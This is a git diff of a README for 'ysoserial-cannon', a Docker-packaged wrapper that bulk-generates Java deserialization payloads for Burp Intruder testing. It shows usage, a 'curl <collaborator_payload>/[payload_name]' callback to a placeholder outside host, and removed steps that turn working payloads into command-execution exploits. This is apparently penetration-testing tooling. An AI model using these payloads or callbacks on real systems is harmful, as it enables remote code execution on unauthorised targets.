@@ -1,28 +1,18 @@
-# ysoserial-wrapper
+# ysoserial-cannon
 
-Python wrapper based for [ysoserial](https://github.com/frohoff/ysoserial) to make exploitation of the JAVA [Insecure Deserialization](https://portswigger.net/web-security/deserialization) user-friendly.
+Python wrapper based for [ysoserial](https://github.com/frohoff/ysoserial) and [ysoserial-wrapper](https://github.com/aludermin/ysoserial-wrapper) to make exploitation of the JAVA [Insecure Deserialization](https://portswigger.net/web-security/deserialization) vulnerabilities, perfect for situations where you need to rapidly test all payloads in bulk and automate the process of firing them off in tools like Burp Suite Intruder to find vulnerabilities fast.
 
 ## Requirements
-- Installed JAVA JDK 11
-Kali:
+- Pull image:
 ```shell
-sudo apt-get install openjdk-11-jdk
-```
-- Some python dependencies
-```
-pip3 install -r requirements.txt
-```
-- ysoserial itself
-```
-wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
+docker pull b3xal/ysoserial-cannon
 ```
 
 ## Usage
 ```
-python ysoserial-wrapper.py -h
-usage: ysoserial-wrapper.py [-h] [-c 'COMMAND'] [-gzip] [-b64]
+docker run -it --rm b3xal/ysoserial-cannon -h
 
-ysoserial-wrap.py - Command execution wrapper for ysoserial-all.jar
+usage: docker run -it --rm b3xal/ysoserial-cannon [-h] [-c 'COMMAND'] [-gzip] [-b64]
 
 options:
   -h, --help            show this help message and exit
@@ -36,7 +26,7 @@ options:
 ## Walkthrough
 Without any parameters given, it will ask for a collaborator url:
 ```
-python ysoserial-wrapper.py   
+docker run -it --rm b3xal/ysoserial-cannon   
 [*] No payload defined, using curl <collaborator_payload>/[payload_name]
 [!]	Enter your collaborator payload:
 
@@ -45,7 +35,7 @@ and build every possible payload using command:
 ```
 curl <collaborator_payload>/[payload_name]
 ```
-and copy them to clipboard:
+and then displays them in order to copy the required payloads to your intruder:
 ```
 [+]		Generating Spring1 payload ...
 [+]		Generating Spring2 payload ...
@@ -56,27 +46,12 @@ and copy them to clipboard:
 
 ```
 
+![Collaborator](img/payloads.png)
+
 You can use them in an Intruder attack to check which payloads worked:
+
+![Collaborator](img/intruder.png)
 ![Collaborator](img/collaborator.png)
-
-Then it will ask for payloads, which wored ...
-```
-[!] Paste in the payloads that worked (separated by spaces)
-```
-... and a command to execute
-```
-[!] Paste in the command you want to execute:
-```
-
-Nothing more to say:
-```
-[+]		Generating exploit with payload CommonsCollections2 ...
-[+]		Generating exploit with payload CommonsCollections4 ...
-
-[!] There are 2 exploits waiting in your clipboard... 
-Good luck
-
-```
 
 ## Worth reading
 
@@ -87,5 +62,3 @@ There are 2 switches to modify this behaviour:
 
 You can also use `-c` or `-command` switch to generate payloads of your choice from the start.
 Beware of quotes in commands :)
-
-I also added a simple `.bcheck` snippet that will detect placing serialized cookies.
